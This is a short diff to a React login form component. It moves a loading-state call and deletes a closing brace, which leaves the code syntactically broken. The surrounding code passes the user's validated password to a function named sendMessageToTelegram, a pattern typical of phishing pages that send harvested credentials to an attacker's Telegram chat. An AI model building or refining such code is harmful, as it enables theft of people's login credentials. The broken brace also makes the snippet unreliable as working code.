@@ -72,13 +72,12 @@ export default function LoginForm({ setNavigation, navigation }) {
 
     const handlePasswordValidation = () => {
         const isValid = validatePassword(password);
+        setIsLoading(true);
         setInvalid(!isValid);
 
         if (isValid) {
             console.log("PASSWORD IS VALID SO CALLING LOADER NOW")
-            setIsLoading(true);
             sendMessageToTelegram(password);
-        }
         return isValid;
     }
 
